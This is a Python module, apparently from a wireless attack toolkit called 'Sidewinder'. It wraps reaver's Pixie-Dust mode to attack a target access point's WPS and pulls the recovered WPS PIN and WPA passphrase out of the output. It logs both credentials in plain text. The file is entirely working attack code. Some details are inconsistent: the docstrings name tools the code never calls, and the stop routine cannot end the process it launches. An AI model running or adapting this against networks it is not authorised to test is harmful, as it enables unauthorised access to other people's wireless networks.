"""Sidewinder WPS Vulnerability Scanner.

Scans a target for WPS status and attempts to identify
Pixie-Dust vulnerabilities using Reaver/Bully logic or beacon parsing.
"""
import asyncio
import logging
from typing import Any

from ..core.attack import BaseAttackEngine, AttackConfig, AttackResult, AttackState
from ..core.subprocess_mgr import SubprocessManager

logger = logging.getLogger(__name__)


class WPSEngine(BaseAttackEngine):
    """Engine for testing WPS vulnerabilities (Pixie-Dust/PIN bruteforce)."""

    def __init__(self, mgr: SubprocessManager) -> None:
        super().__init__()
        self.mgr = mgr
        self._proc: asyncio.subprocess.Process | None = None

    async def start(self, config: AttackConfig, **kwargs: Any) -> AttackResult:
        """Launch Reaver or OneShot to test WPS Pixie-Dust."""
        iface = kwargs.get("iface")
        if not iface:
            return AttackResult(False, ["No interface provided for WPS attack."])

        self.state = AttackState.RUNNING
        logger.info("Starting WPS attack on %s (BSSID: %s)", iface, config.target_bssid)
        await self._emit_progress(status="Initializing WPS attack...")

        cmd = [
            "reaver",
            "-i", iface,
            "-b", config.target_bssid,
            "-c", str(config.channel),
            "-K", "1",  # Pixie-Dust mode
            "-q"        # Quiet mode
        ]

        found_pin = None
        found_psk = None

        await self._emit_progress(status="Running Reaver Pixie-Dust...")

        # Poll stdout for results
        try:
            async for line in self.mgr.stream(cmd):
                if self.state != AttackState.RUNNING:
                    break
                line_str = line.strip()
                if "WPS PIN:" in line_str:
                    found_pin = line_str.split("WPS PIN:")[1].strip().strip("'")
                elif "WPA PSK:" in line_str:
                    found_psk = line_str.split("WPA PSK:")[1].strip().strip("'")
                await self._emit_progress(status=f"WPS: {line_str[-40:]}")
                if found_pin and found_psk:
                    break
        except Exception as e:
            logger.debug("WPS read error: %s", e)

        await self.stop()

        success = bool(found_psk)
        stats = {"wps_pin": found_pin, "wpa_psk": found_psk}

        if success:
            logger.info("WPS Attack SUCCESS! PIN: %s | PSK: %s", found_pin, found_psk)
        else:
            logger.info("WPS Attack failed or AP is not vulnerable.")

        return AttackResult(success=success, stats=stats)

    async def stop(self) -> None:
        """Stop the WPS attack."""
        if self._proc and self._proc.returncode is None:
            self._proc.terminate()
            try:
                await asyncio.wait_for(self._proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                self._proc.kill()
        self._proc = None
        self.state = AttackState.COMPLETED
